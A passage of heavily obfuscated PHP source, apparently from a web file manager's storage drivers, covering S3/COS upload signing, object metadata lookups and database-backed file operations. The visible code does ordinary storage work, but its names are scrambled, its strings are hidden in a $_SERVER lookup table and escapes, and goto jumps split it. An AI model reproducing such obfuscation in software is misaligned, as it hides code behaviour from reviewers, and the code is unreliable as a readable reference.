$Ôû·åß = explode($¨†É‡Ò‰[220], $this->getHost()); $ú–âšÒ = array($¨†É‡Ò‰[303] => $Ôû·åß[1], $¨†É‡Ò‰[304] => $¨†É‡Ò‰[12], $¨†É‡Ò‰[258] => $¨†É‡Ò‰[133], $¨†É‡Ò‰[305] => $“Šãª[$¨†É‡Ò‰[89]]); $¾²†Ó„ñ = $¨†É‡Ò‰[265]; $¹ß¤Ú…è = $¨†É‡Ò‰[8] . $this->pathEncode($×¢²Œáç); $šß’Ş = array_intersect_key($“Šãª, array_flip(array($¨†É‡Ò‰[295], $¨†É‡Ò‰[293]))); $àš¥±Ù¦ = $this->client->__getSignatureV4($öè»…Ï, $ú–âšÒ, $¾²†Ó„ñ, $¹ß¤Ú…è, $šß’Ş); return array($¨†É‡Ò‰[297] => $àš¥±Ù¦, $¨†É‡Ò‰[301] => $öè»…Ï[$¨†É‡Ò‰[301]], $¨†É‡Ò‰[294] => $öè»…Ï[$¨†É‡Ò‰[285]]); } public function uploadListAuthV4($üğœÀÃ, $‚º‚ÌØ = array()) { $¿Šá—Íö =& $_SERVER[¼èá¯æÙ]; $Ëå—›òò = $‚º‚ÌØ[$¿Šá—Íö[107]]; $œ®ê»Ìû = $‚º‚ÌØ[$¿Šá—Íö[293]]; $¯Øä›«ò = $this->client->listParts($this->bucket, $Ëå—›òò, $œ®ê»Ìû); if (!$¯Øä›«ò) { return !1; } $¨Öúˆ³“ = $¿Šá—Íö[306]; foreach ($¯Øä›«ò as $° çĞ¤) { $¨Öúˆ³“ .= $¿Šá—Íö[307] . "\x3c\120\x61\162\x74\x4e\x75\x6d\x62\145\162\x3e{$° çĞ¤[$¿Šá—Íö[308]]}\74\57\120\141\162\x74\116\x75\x6d\142\145\162\76\xa" . "\74\x45\x54\141\147\x3e{$° çĞ¤[$¿Šá—Íö[309]]}\x3c\57\x45\x54\141\x67\x3e\xa" . $¿Šá—Íö[310]; } $¨Öúˆ³“ .= $¿Šá—Íö[311]; $£ Î»¿ = array($¿Šá—Íö[285] => gmdate($¿Šá—Íö[292]), $¿Šá—Íö[301] => hash($¿Šá—Íö[287], $¨Öúˆ³“)); $ó¦®€“ = explode($¿Šá—Íö[220], $this->getHost()); $ç•€“Á = array($¿Šá—Íö[303] => $ó¦®€“[1], $¿Šá—Íö[258] => $¿Šá—Íö[133], $¿Šá—Íö[305] => strlen($¨Öúˆ³“)); $±Ï«Òºµ = $¿Šá—Íö[299]; $¼â˜†‘ä = $¿Šá—Íö[8] . $this->pathEncode($Ëå—›òò); $Ä¹´’ü° = array($¿Šá—Íö[293] => $œ®ê»Ìû); $ìùì¬ = $this->client->__getSignatureV4($£ Î»¿, $ç•€“Á, $±Ï«Òºµ, $¼â˜†‘ä, $Ä¹´’ü°); return array($¿Šá—Íö[297] => $ìùì¬, $¿Šá—Íö[301] => $£ Î»¿[$¿Šá—Íö[301]], $¿Šá—Íö[294] => $£ Î»¿[$¿Šá—Íö[285]], $¿Šá—Íö[300] => $¯Øä›«ò); } private function _isClientAsync() { $×‹šÌ¦Ù =& $_SERVER[¼èá¯æÙ]; static $§ˆïœ“ = null; if ($§ˆïœ“ === null) { $„¢é²Ê = isset($_REQUEST[$×‹šÌ¦Ù[312]]) ? json_decode($_REQUEST[$×‹šÌ¦Ù[312]], !0) : !1; $§ˆïœ“ = $„¢é²Ê && _get($„¢é²Ê, $×‹šÌ¦Ù[313]) == $×‹šÌ¦Ù[314]; } return $§ˆïœ“; } public function getHost() { $¾÷Î‰›‡ =& $_SERVER[¼èá¯æÙ]; $æ™­ƒÛô = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¾÷Î‰›‡[80], $¾÷Î‰›‡[74], $¾÷Î‰›‡[79], $¾÷Î‰›‡[72]))) { return $æ™­ƒÛô . $¾÷Î‰›‡[8] . $this->bucket; } if ($this->osType == $¾÷Î‰›‡[72] && !is_domain($æ™­ƒÛô)) { return $æ™­ƒÛô . $¾÷Î‰›‡[8] . $this->bucket; } $æ™­ƒÛô = explode($¾÷Î‰›‡[220], $æ™­ƒÛô); return $æ™­ƒÛô[0] . $¾÷Î‰›‡[220] . $this->bucket . $¾÷Î‰›‡[10] . $æ™­ƒÛô[1]; } public function size($ğğõ«Öî) { $†‰½°ıù = $this->objectMeta($ğğõ«Öî); return $†‰½°ıù ? $†‰½°ıù[$_SERVER[¼èá¯æÙ][89]] : 0; } public function info($›’„íÑ—) { if ($this->isFolder($›’„íÑ—)) { return $this->folderInfo($›’„íÑ—); } else { if ($this->isFile($›’„íÑ—)) { return $this->fileInfo($›’„íÑ—); } } return !1; } public function exist($»­Üì¯) { return $this->isFile($»­Üì¯) || $this->isFolder($»­Üì¯); } public function isFile($×üä‘¼À) { return !$this->isFolder($×üä‘¼À) && $this->objectMeta($×üä‘¼À); } public function isFolder($¦÷¢Š»Ğ) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][189], $¦÷¢Š»Ğ); } protected function objectMeta($Ó¿šØÂ) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][191], $Ó¿šØÂ); } protected function _objectMeta($ÇÚñÃÀı) { $öÁ”…¦› =& $_SERVER[¼èá¯æÙ]; $ÇÚñÃÀı = rtrim($ÇÚñÃÀı, $öÁ”…¦›[8]); try { $Ì®âÈü‘ = $this->client->getObjectInfo($this->bucket, $ÇÚñÃÀı); if (!isset($Ì®âÈü‘[$öÁ”…¦›[264]]) && isset($Ì®âÈü‘[$öÁ”…¦›[315]])) { $Ì®âÈü‘[$öÁ”…¦›[264]] = $Ì®âÈü‘[$öÁ”…¦›[315]]; } } catch (Exception $ì§˜Üãø) { $Ì®âÈü‘ = !1; } if (!$Ì®âÈü‘) { } return $Ì®âÈü‘; } protected function _isFolder($û—šûôŒ) { $ÏÂËç =& $_SERVER[¼èá¯æÙ]; $û—šûôŒ = rtrim($û—šûôŒ, $ÏÂËç[8]) . $ÏÂËç[8]; if ($û—šûôŒ == $ÏÂËç[12] || $û—šûôŒ == $ÏÂËç[8]) { return !0; } $îıİ ç» = $this->client->getBucket($this->bucket, $û—šûôŒ, null, 1); if (empty($îıİ ç»[$ÏÂËç[248]])) { return !1; } $Ò§İ¢ = $îıİ ç»[$ÏÂËç[248]][0][$ÏÂËç[32]]; return stripos($Ò§İ¢, $û—šûôŒ) === 0 ? !0 : !1; if (substr($Ò§İ¢, -1) == $ÏÂËç[8]) { return !0; } if (get_path_this($Ò§İ¢) == get_path_this($û—šûôŒ)) { return !1; } return !0; } public function listObject($¾Æİ™ÓÒ) { return $this->fileList($¾Æİ™ÓÒ, $_SERVER[¼èá¯æÙ][12], !0); } } goto D—ƒ«…å™; CµáãºÖ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($­ù¬ü) { parent::__construct($­ù¬ü); $this->setSignVersion($_SERVER[¼èá¯æÙ][259]); } public function uploadFormData($Ş—ë¹öŸ, $ÑÎêÃò€ = 3600) { $¡ÍŞ€ü£ =& $_SERVER[¼èá¯æÙ]; $úÉÜ¼€Ò = $¡ÍŞ€ü£[241]; $¸‰Îì³ï = $¡ÍŞ€ü£[1417]; $Õ¨€‡ª‰ = $¡ÍŞ€ü£[273]; $ŒúğÚùÏ = gmdate($¡ÍŞ€ü£[1418], time() + $ÑÎêÃò€); $ÇğŒüÂ‰ = (string) time() . $¡ÍŞ€ü£[84] . (string) (time() + $ÑÎêÃò€); $ÈúèàÊÚ = array($¡ÍŞ€ü£[274] => $ŒúğÚùÏ, $¡ÍŞ€ü£[277] => array(array($¡ÍŞ€ü£[317] => $úÉÜ¼€Ò), array($¡ÍŞ€ü£[278] => $this->bucket), array($¡ÍŞ€ü£[279], $¡ÍŞ€ü£[280], $¡ÍŞ€ü£[12]), array($¡ÍŞ€ü£[282] => $Õ¨€‡ª‰), array($¡ÍŞ€ü£[1419] => $¸‰Îì³ï), array($¡ÍŞ€ü£[1420] => $this->accessKey), array($¡ÍŞ€ü£[1421] => $ÇğŒüÂ‰))); $ÈúèàÊÚ = json_encode($ÈúèàÊÚ); $ËûøÈ = hash_hmac($¡ÍŞ€ü£[1417], $ÇğŒüÂ‰, $this->secret); $¬±¦•ƒã = sha1($ÈúèàÊÚ); $ÛÆ£¶îµ = hash_hmac($¡ÍŞ€ü£[1417], $¬±¦•ƒã, $ËûøÈ); $ñ“´İÉÉ = array($¡ÍŞ€ü£[317] => $úÉÜ¼€Ò, $¡ÍŞ€ü£[282] => $Õ¨€‡ª‰, $¡ÍŞ€ü£[289] => base64_encode($ÈúèàÊÚ), $¡ÍŞ€ü£[1419] => $¸‰Îì³ï, $¡ÍŞ€ü£[1420] => $this->accessKey, $¡ÍŞ€ü£[1422] => $ÇğŒüÂ‰, $¡ÍŞ€ü£[1423] => $ÛÆ£¶îµ, $¡ÍŞ€ü£[218] => $this->getHost()); return $ñ“´İÉÉ; } public function fileOutImage($öÛ«ÈÒÈ, $¾µôÉú½ = 250) { $»ÙÈ¢ôÙ =& $_SERVER[¼èá¯æÙ]; if ($this->size($öÛ«ÈÒÈ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($öÛ«ÈÒÈ, $¾µôÉú½); } $¬şá‹¥á = $this->link($öÛ«ÈÒÈ); $¬şá‹¥á .= $»ÙÈ¢ôÙ[1424] . $¾µôÉú½ . $»ÙÈ¢ôÙ[1425]; $this->fileOutLink($¬şá‹¥á); } public function fileOutLink($Ó·î×À) { $†÷úúç =& $_SERVER[¼èá¯æÙ]; if (substr($Ó·î×À, 0, 7) == $†÷úúç[228]) { $Ó·î×À = $†÷úúç[229] . substr($Ó·î×À, 7); } header($†÷úúç[185] . $Ó·î×À); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ÿæä™º°) { $this->pathParse = $Ÿæä™º°; $this->model = Model($_SERVER[¼èá¯æÙ][1426]); } public function getPath($½ç†ï—´) { return trim($½ç†ï—´, $_SERVER[¼èá¯æÙ][8]); } public function pathFather($Ñšïã×Ş) { $Â—ªÑå = $this->parse($Ñšïã×Ş); $Â—ªÑå = $this->infoSimple($Ñšïã×Ş); return $Â—ªÑå ? $Â—ªÑå[$_SERVER[¼èá¯æÙ][202]] : !1; } public function pathThis($æáëı‡Ù) { $”öŸ“÷ = $this->infoSimple($æáëı‡Ù); return $”öŸ“÷ ? $”öŸ“÷[$_SERVER[¼èá¯æÙ][32]] : !1; } public function getPathOuter($Ö†ûÆ²É) { if (!$Ö†ûÆ²É) { return $Ö†ûÆ²É; } $ĞôÃã«ï = $this->parse($Ö†ûÆ²É); return KodIO::make($ĞôÃã«ï[$_SERVER[¼èá¯æÙ][486]]); } public function copyFolderFromIO($«ûÉº’è, $ª£¾ö£Ì, $åÁãÂ¼ß, $êí¿ÃËÄ, $˜ªÇøˆª) { $âß×â÷ê = $this->model->copyFolderFromIO($«ûÉº’è, $ª£¾ö£Ì, $åÁãÂ¼ß, $êí¿ÃËÄ, $˜ªÇøˆª); return KodIO::make($âß×â÷ê); } public function isParentOf($òëöê”ò, $ÒÈäÈ‚•) { return $this->model->isParentOf($òëöê”ò, $ÒÈäÈ‚•); } public function mkfile($‚ŒÌù¥ú, $ºÕŸ †ğ = '', $€Éæ¶ÌÜ = REPEAT_RENAME) { $î°óŞÁº =& $_SERVER[¼èá¯æÙ]; $Æ±‘ª = $this->parse($‚ŒÌù¥ú); $‚ŒÌù¥ú = $Æ±‘ª[$î°óŞÁº[486]]; for ($ÅëıĞûø = 0; $ÅëıĞûø < count($Æ±‘ª[$î°óŞÁº[1427]]); $ÅëıĞûø++) { $Û¸Ñ¡¹  = $Æ±‘ª[$î°óŞÁº[1427]][$ÅëıĞûø]; if ($ÅëıĞûø == count($Æ±‘ª[$î°óŞÁº[1427]]) - 1) { $‚ŒÌù¥ú = $this->model->mkfile($‚ŒÌù¥ú, $Û¸Ñ¡¹ , $ºÕŸ †ğ, $€Éæ¶ÌÜ); break; } $‚ŒÌù¥ú = $this->model->mkdir($‚ŒÌù¥ú, $Û¸Ñ¡¹ , REPEAT_SKIP); } return $this->getPathOuter($‚ŒÌù¥ú); } public function mkdir($áÃ³¯´Ì, $ñÃúŸ¸¦ = REPEAT_SKIP) { $®–Ş¥÷œ =& $_SERVER[¼èá¯æÙ]; $ÕÒÍ¨î = $this->parse($áÃ³¯´Ì); $áÃ³¯´Ì = $ÕÒÍ¨î[$®–Ş¥÷œ[486]]; for ($‡§š œğ = 0; $‡§š œğ < count($ÕÒÍ¨î[$®–Ş¥÷œ[1427]]); $‡§š œğ++) { $…æĞÙø = $ÕÒÍ¨î[$®–Ş¥÷œ[1427]][$‡§š œğ]; $áÃ³¯´Ì = $this->model->mkdir($áÃ³¯´Ì, $…æĞÙø, $ñÃúŸ¸¦); } return $this->getPathOuter($áÃ³¯´Ì); } public function copyFile($à¨‰¿ä, $ô¢´Ø, $Œ¡Æã¯ = REPEAT_REPLACE) { $«õùÚº‰ =& $_SERVER[¼èá¯æÙ]; $ÏºááíÂ = $this->parse($ô¢´Ø); $š÷ãÀ¤ = $this->model->copy($à¨‰¿ä, $ÏºááíÂ[$«õùÚº‰[486]], $Œ¡Æã¯, $ÏºááíÂ[$«õùÚº‰[97]]); return $š÷ãÀ¤ ? $this->getPathOuter($š÷ãÀ¤) : !1; } public function moveFile($ÎÀ³Ê‡›, $ü´‡Øåà, $çéñ¬ î = REPEAT_REPLACE) { $½õ“§ =& $_SERVER[¼èá¯æÙ]; $–­ÆÖÂ = $this->parse($ü´‡Øåà); $á©ÖÜĞÖ = $this->model->move($ÎÀ³Ê‡›, $–­ÆÖÂ[$½õ“§[486]], $çéñ¬ î, $–­ÆÖÂ[$½õ“§[97]]); return $á©ÖÜĞÖ ? $this->getPathOuter($á©ÖÜĞÖ) : !1; } public function copy($ğêÖş¨·, $¯ø‰»¤, $»ë¹„Ë™ = REPEAT_REPLACE, $¢æ¢ĞÑ = false) { $»ŒËşõš = $this->parse($¯ø‰»¤); $²ñØ€Î± = $this->model->copy($ğêÖş¨·, $»ŒËşõš[$_SERVER[¼èá¯æÙ][486]], $»ë¹„Ë™, $¢æ¢ĞÑ); return $²ñØ€Î± ? $this->getPathOuter($²ñØ€Î±) : !1; } public function moveSameAllow() { } public function move($•¸òö‡½, $Õ¢ÖÀ¾Ú, $İ¯íè¬ = REPEAT_REPLACE, $ÎëœÑ¼ = false) { $°„ Åâ = $this->parse($Õ¢ÖÀ¾Ú); $øÛ†ìñ = $this->model->move($•¸òö‡½, $°„ Åâ[$_SERVER[¼èá¯æÙ][486]], $İ¯íè¬, $ÎëœÑ¼); return $øÛ†ìñ ? $this->getPathOuter($øÛ†ìñ) : !1; } public function remove($ÃÒû‹ Ô, $·ğúìÓÁ = true) { return $this->model->remove($ÃÒû‹ Ô, $·ğúìÓÁ); } public function rename($ïÜ°·Üô, $Å°‚á®á) { $Ç†Á˜Ê¹ = $this->model->rename($ïÜ°·Üô, $Å°‚á®á); return $Ç†Á˜Ê¹ ? $this->getPathOuter($ïÜ°·Üô) : $Ç†Á˜Ê¹; } public function size($ÉÎ‹‘) { $Âˆ¡Áõ = $this->infoSimple($ÉÎ‹‘); return $Âˆ¡Áõ ? $Âˆ¡Áõ[$_SERVER[¼èá¯æÙ][89]] : 0; } public function infoSimple($ö›°–µë) { return $this->model->sourceInfo($ö›°–µë); } public function info($¿ß¡ë‡Õ) { return $this->infoParse($¿ß¡ë‡Õ); } public function infoAuth($œ¤éëªÏ) { return $this->infoParse($œ¤éëªÏ, !1, !0); } public function infoWithChildren($¨İÔš‹) { return $this->infoParse($¨İÔš‹, !0); } protected function infoParse($´ç×Öşš, $›èÖëÛŒ = false, $æ”‰¸Ø¨ = false) { if (!$›èÖëÛŒ) { return $this->model->pathInfo($´ç×Öşš, $æ”‰¸Ø¨); } return $this->model->pathInfoMore($´ç×Öşš); } public function infoFullSimple($²ÈÑ‚§ª) { $à÷¦Ğö¤ =& $_SERVER[¼èá¯æÙ]; $Ï’Ş¬ÓË = explode($à÷¦Ğö¤[8], $²ÈÑ‚§ª); $õûäÙ½ = implode($à÷¦Ğö¤[8], array_splice($Ï’Ş¬ÓË, 1)); return $this->model->pathInfoByPath($Ï’Ş¬ÓË[0], $õûäÙ½); } public function infoFull($£¯¸™Şá) { $ç§úã«ë = $this->infoFullSimple($£¯¸™Şá); return is_array($ç§úã«ë) ? $this->model->pathInfo($ç§úã«ë[$_SERVER[¼èá¯æÙ][203]]) : !1; } public function hashSimple($ƒş¨ƒ§Å) { $î¥¢×ÙÂ =& $_SERVER[¼èá¯æÙ]; $–•õ¶€è = $this->infoWithChildren($ƒş¨ƒ§Å); return $–•õ¶€è[$î¥¢×ÙÂ[180]][$î¥¢×ÙÂ[686]]; } public function hashMd5($¹ „èĞ) { $ò·ö÷æá =& $_SERVER[¼èá¯æÙ]; $à¯»€ÂÏ = $this->infoWithChildren($¹ „èĞ); return $à¯»€ÂÏ[$ò·ö÷æá[180]][$ò·ö÷æá[558]]; } public function exist($¿Â¶èş­) { $©·©°‚× =& $_SERVER[¼èá¯æÙ]; $Õ·ˆÓıœ = $this->parse($¿Â¶èş­); if (!$Õ·ˆÓıœ[$©·©°‚×[97]]) { return $this->isFile($¿Â¶èş­) || $this->isFolder($¿Â¶èş­); } $ÓÍÇöÌ¦ = array($©·©°‚×[488] => $Õ·ˆÓıœ[$©·©°‚×[486]], $©·©°‚×[32] => $Õ·ˆÓıœ[$©·©°‚×[97]]); $†Ú‹áÖŸ = $this->model->where($ÓÍÇöÌ¦)->find(); return $†Ú‹áÖŸ ? !0 : !1; } public function isFile($ı€¼÷©‘) { $ËÄ¡»Œö =& $_SERVER[¼èá¯æÙ]; $ÖøúÀö = $this->infoSimple($ı€¼÷©‘); return $ÖøúÀö && $ÖøúÀö[$ËÄ¡»Œö[496]] == $ËÄ¡»Œö[240] ? !0 : !1; } public function isFolder($“ÓÑé™Á) { $û†ô¤­¸ =& $_SERVER[¼èá¯æÙ]; $œÏ³«“¢ = $this->infoSimple($“ÓÑé™Á); return $œÏ³«“¢ && $œÏ³«“¢[$û†ô¤­¸[496]] == $û†ô¤­¸[101] ? !0 : !1; } public function listPath($ÏŒ«Ï±è, $âúÌ±¨Ó = false) { $‡ßÁØüÆ =& $_SERVER[¼èá¯æÙ]; if ($ÏŒ«Ï±è == $‡ßÁØüÆ[12]) { return !1; } $éôêÆ²· = array($‡ßÁØüÆ[488] => $ÏŒ«Ï±è); if ($âúÌ±¨Ó) { return $this->model->listSource($éôêÆ²·, -1); } return $this->model->listSource($éôêÆ²·); } public function has($ƒ®–ÙÊœ, $²¼ÈÎçÖ = false, $…Œ„Ğ½Ã = null) { $ïŠ‡¨ôú =& $_SERVER[¼èá¯æÙ]; $ç¶‚šŸ = $this->infoWithChildren($ƒ®–ÙÊœ); if ($²¼ÈÎçÖ) { return array($ïŠ‡¨ôú[252] => $ç¶‚šŸ[$ïŠ‡¨ôú[252]], $ïŠ‡¨ôú[251] => $ç¶‚šŸ[$ïŠ‡¨ôú[251]]); } return $…Œ„Ğ½Ã ? $ç¶‚šŸ[$ïŠ‡¨ôú[252]] : $ç¶‚šŸ[$ïŠ‡¨ôú[251]]; } public function listAll($®¦‰Ì¸æ) { $˜¬»¯ïø = IO::info($this->pathParse[$_SERVER[¼èá¯æÙ][97]]); if (!$˜¬»¯ïø) { return array(); } return $this->model->listAll($®¦‰Ì¸æ); } public function getContent($»õñ¯äå) { return $this->model->getContent($»õñ¯äå); } public function setContent($Ô¬Õ¼©°, $¶ëøÌ€ê = '') { return $this->model->setContent($Ô¬Õ¼©°, $¶ëøÌ€ê); } public function fileSubstr($´ÕÃÀ¹”, $Ğ‡ÃôüÃ, $…Ÿöî„) { return $this->model->fileSubstr($´ÕÃÀ¹”, $Ğ‡ÃôüÃ, $…Ÿöî„); } public function download($’¸‚ùŠœ, $âç¹©¼ = '') { $„”Ÿ©× = get_path_father($âç¹©¼); $Ç·ËÃÇ¶ = get_path_this($âç¹©¼); $™Ë²À¦ = $this->model->fileInfoGet($’¸‚ùŠœ); $Ã­ë´‰È = IO::copy($™Ë²À¦[$_SERVER[¼èá¯æÙ][97]], $„”Ÿ©×, !1, $Ç·ËÃÇ¶); return $Ã­ë´‰È; } public function setModifyTime($äŸ¯óÆ‘, $©×÷Àºå = '') { $¤ÌÈ›ÄÅ =& $_SERVER[¼èá¯æÙ]; if (!$äŸ¯óÆ‘) { return; } $this->model->where(array($¤ÌÈ›ÄÅ[502] => $äŸ¯óÆ‘))->save(array($¤ÌÈ›ÄÅ[98] => $©×÷Àºå)); } public function upload($·¾£­şı, $óşä½¹, $Ï—­ıƒû = false, $±”¶Ş…Õ = REPEAT_REPLACE) { $–Ûåğô… =& $_SERVER[¼èá¯æÙ]; $ÃÚÓ³¢º = $this->parse($·¾£­şı); $¯½ñ¾ÅŸ = $this->model->addFile($ÃÚÓ³¢º[$–Ûåğô…[486]], $óşä½¹, $ÃÚÓ³¢º[$–Ûåğô…[97]], $Ï—­ıƒû, $±”¶Ş…Õ); return $this->getPathOuter($¯½ñ¾ÅŸ); } public function uploadFileByID($øÓÃ™ƒ¨, $³±ÛÊê¡, $´ûÎƒÓŠ) { $’•¸œÀ =& $_SERVER[¼èá¯æÙ]; $ÖŒ˜ÍÖ = $this->parse($øÓÃ™ƒ¨); $ ß¦õşã = $this->model->addFileByFileID($ÖŒ˜ÍÖ[$’•¸œÀ[486]], $³±ÛÊê¡, $ÖŒ˜ÍÖ[$’•¸œÀ[97]], $´ûÎƒÓŠ); return $this->getPathOuter($ ß¦õşã); } public function addFileByRemote($‰ŠÆÖá, $–²‰¾åš, $ª¤î«© = array(), $«š‹öá’ = '', $·áëóè) { $œõ®êË™ =& $_SERVER[¼èá¯æÙ]; $ñÌ‹æå• = $this->parse($‰ŠÆÖá); $«š‹öá’ = empty($«š‹öá’) ? $ñÌ‹æå•[$œõ®êË™[97]] : $«š‹öá’; $ùñ¾¤ğâ = $this->model->addFileByRemote($ñÌ‹æå•[$œõ®êË™[486]], $–²‰¾åš, $«š‹öá’, $ª¤î«©, $·áëóè); return $this->getPathOuter($ùñ¾¤ğâ); } public function uploadLink($àç¤…¬, $¥›Ü•À = 0) { $®õÆ¤¯¨ =& $_SERVER[¼èá¯æÙ]; $ã’áôçñ = $this->parse($àç¤…¬); $ª½Ôò = _get($GLOBALS[$®õÆ¤¯¨[7]], $®õÆ¤¯¨[1428]); $‚¼Ì”Äš = _get($GLOBALS[$®õÆ¤¯¨[7]], $®õÆ¤¯¨[1429]); $àç¤…¬ = Model($®õÆ¤¯¨[688])->createFileName($ã’áôçñ[$®õÆ¤¯¨[97]], $ª½Ôò, $‚¼Ì”Äš); return IO::uploadLink($àç¤…¬, $¥›Ü•À); } public function fileNameAuto($”¾³¤Ò, $€êòĞ¦, $…Ä´ßî = REPEAT_REPLACE, $ÊêëËÄ = false) { return $this->model->fileNameAuto($”¾³¤Ò, $€êòĞ¦, $…Ä´ßî, $ÊêëËÄ); } public function fileNameExist($âô¢â×Û, $áìß¤·Ì) { return $this->model->fileNameExist($âô¢â×Û, $áìß¤·Ì); } protected function _fileOut($êÊ •øÃ, $˜ş¥æŞ¦ = false, $¥şëäŠŒ = false, $ˆ¦‹ Ä = '', $±›ÀšÂ´ = false) { $Ù±Ùäû =& $_SERVER[¼èá¯æÙ]; $Ò“æ¡Áå = $this->model->sourceInfo($êÊ •øÃ); if ($Ò“æ¡Áå[$Ù±Ùäû[496]] == $Ù±Ùäû[101]) { header($Ù±Ùäû[1430]); die; } $²ÊÆûåş = $this->model->fileInfoGet($êÊ •øÃ); $ˆ¦‹ Ä = $²ÊÆûåş[$Ù±Ùäû[558]] ? $²ÊÆûåş[$Ù±Ùäû[558]] : $ˆ¦‹ Ä; $Ëİ©™÷Ş = isset($GLOBALS[$Ù±Ùäû[192]]) && is_array($GLOBALS[$Ù±Ùäû[192]]) ? $GLOBALS[$Ù±Ùäû[192]][$Ù±Ùäû[32]] : $Ò“æ¡Áå[$Ù±Ùäû[32]]; if ($±›ÀšÂ´) { return IO::fileOutServer($²ÊÆûåş[$Ù±Ùäû[97]], $˜ş¥æŞ¦, $Ëİ©™÷Ş, $ˆ¦‹ Ä); } IO::fileOut($²ÊÆûåş[$Ù±Ùäû[97]], $˜ş¥æŞ¦, $Ëİ©™÷Ş, $ˆ¦‹ Ä); } public function fileOut($µá²ÂÀƒ, $ààà¦Éõ = false, $ËâÏÓõ = false, $Š·õ“—‰ = '') { $this->_fileOut($µá²ÂÀƒ, $ààà¦Éõ, $ËâÏÓõ, $Š·õ“—‰); } public function fileOutServer($ä¯³¾, $±Ù¹üŠ® = false, $–‡İÎ¼‘ = false, $€şïÒÍî = '') { $this->_fileOut($ä¯³¾, $±Ù¹üŠ®, $–‡İÎ¼‘, $€şïÒÍî, !0); } protected function _fileOutImage($†ö’åÃ–, $ÃŞèìâ = 250) { $ã…”©™ =& $_SERVER[¼èá¯æÙ]; $«ÑÔÖ·ª = $this->model->pathInfo($†ö’åÃ–); if ($«ÑÔÖ·ª[$ã…”©™[496]] == $ã…”©™[101]) { show_json($ã…”©™[1431] . $†ö’åÃ–, !1); } $™‘Êé¯‚ = $this->model->fileInfoGet($†ö’åÃ–); $«ÑÔÖ·ª[$ã…”©™[193]] = $™‘Êé¯‚[$ã…”©™[97]]; $GLOBALS[$ã…”©™[192]] = $«ÑÔÖ·ª; IO::fileOutImage($™‘Êé¯‚[$ã…”©™[97]], $ÃŞèìâ); } public function fileOutImage($Ö‡Ğ·şİ, $‘”««çÁ = 250) { $this->_fileOutImage($Ö‡Ğ·şİ, $‘”««çÁ); } public function fileOutImageServer($¢•‰ŒÒ, $Çü±àÊ = 250) { $this->_fileOutImage($¢•‰ŒÒ, $Çü±àÊ); } public function link($˜÷¾–­³, $Áà«êÆØ = '') { $Ø¬çŒœû = $this->model->fileInfoGet($˜÷¾–­³); return IO::link($Ø¬çŒœû[$_SERVER[¼èá¯æÙ][97]], $Áà«êÆØ); } protected function parse($Í„ÄÎÆ) { $Ì§¢¤Ï· =& $_SERVER[¼èá¯æÙ]; if (strstr($Í„ÄÎÆ, $Ì§¢¤Ï·[8]) === !1) { return array($Ì§¢¤Ï·[504] => intval($Í„ÄÎÆ), $Ì§¢¤Ï·[97] => $Ì§¢¤Ï·[12], $Ì§¢¤Ï·[1427] => array()); } $œ‚Ææùƒ = explode($Ì§¢¤Ï·[8], trim($Í„ÄÎÆ, $Ì§¢¤Ï·[8])); if (count($œ‚Ææùƒ) < 2) { show_tips(clear_html($Í„ÄÎÆ) . $Ì§¢¤Ï·[1432]); } return array($Ì§¢¤Ï·[504] => intval($œ‚Ææùƒ[0]), $Ì§¢¤Ï·[97] => $œ‚Ææùƒ[1], $Ì§¢¤Ï·[1427] => array_slice($œ‚Ææùƒ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($…•œ»ßğ) { $this->pathParse = $…•œ»ßğ; $this->model = Model($_SERVER[¼èá¯æÙ][1426]); } public function getPathOuter($ú’áğ’Ö) { $äß×Ø…î =& $_SERVER[¼èá¯æÙ]; if (!$ú’áğ’Ö) { return $ú’áğ’Ö; } $¬Â±ãÔĞ = $this->parse($ú’áğ’Ö); return trim(KodIO::makeShare($this->pathParse[$äß×Ø…î[486]], $¬Â±ãÔĞ[$äß×Ø…î[486]]), $äß×Ø…î[8]); } protected function infoParse($’ª¬ı®Å, $¦ä´ßÆĞ = false, $µÎ±ìŸ = false) { $ÆßŸ‰³¨ =& $_SERVER[¼èá¯æÙ]; $‹”„â¶Ü = $this->pathParse[$ÆßŸ‰³¨[486]]; $¾÷œÅ†© = trim($this->pathParse[$ÆßŸ‰³¨[1255]], $ÆßŸ‰³¨[8]); return Action($ÆßŸ‰³¨[1433])->sharePathInfo($‹”„â¶Ü, $¾÷œÅ†©, $¦ä´ßÆĞ); } public function infoFull($º¤³™úê) { $šâœ³´£ =& $_SERVER[¼èá¯æÙ]; $èÀÚ«™© = explode($šâœ³´£[8], trim($º¤³™úê, $šâœ³´£[8])); if (count($èÀÚ«™©) > 1) { $Ù×¦Ò‰ = implode($šâœ³´£[8], array_splice($èÀÚ«™©, 1)); $˜‰ŸšÏÅ = $this->model->pathInfoByPath($èÀÚ«™©[0], $Ù×¦Ò‰); if (!$˜‰ŸšÏÅ) { return !1; } $this->pathParse[$šâœ³´£[1255]] = $˜‰ŸšÏÅ[$šâœ³´£[203]]; } return $this->infoParse($º¤³™úê); } public function listAll($áÑÇ—¤€) { $—¼¿ô© =& $_SERVER[¼èá¯æÙ]; $Ñ”ĞÙ¦« = IO::info($this->pathParse[$—¼¿ô©[97]]); if (!$Ñ”ĞÙ¦«) { return array(); } $óßı–Ñ€ = $this->model->listAll($áÑÇ—¤€); $ìüôÔ§Ü = Model($—¼¿ô©[678])->getInfo($Ñ”ĞÙ¦«[$—¼¿ô©[679]]); foreach ($óßı–Ñ€ as &$Â˜ß¢²‘) { check_abort(); $Â˜ß¢²‘[$—¼¿ô©[100]] = Action($—¼¿ô©[1433])->_shareItemeParse($Â˜ß¢²‘[$—¼¿ô©[100]], $ìüôÔ§Ü); } unset($Â˜ß¢²‘); return $óßı–Ñ€; } } goto cë´„ÚÇ‰²; C‡Ò¹ÉÁ¨: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\154\x65\x5f\x63\x6f\156\x74\x65\156\164\x73"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\x6d\145", "\164\x69\155\145", "\151\x6e\x73\145\162\x74", "\146\x75\156\143\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\145"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\155\145" => 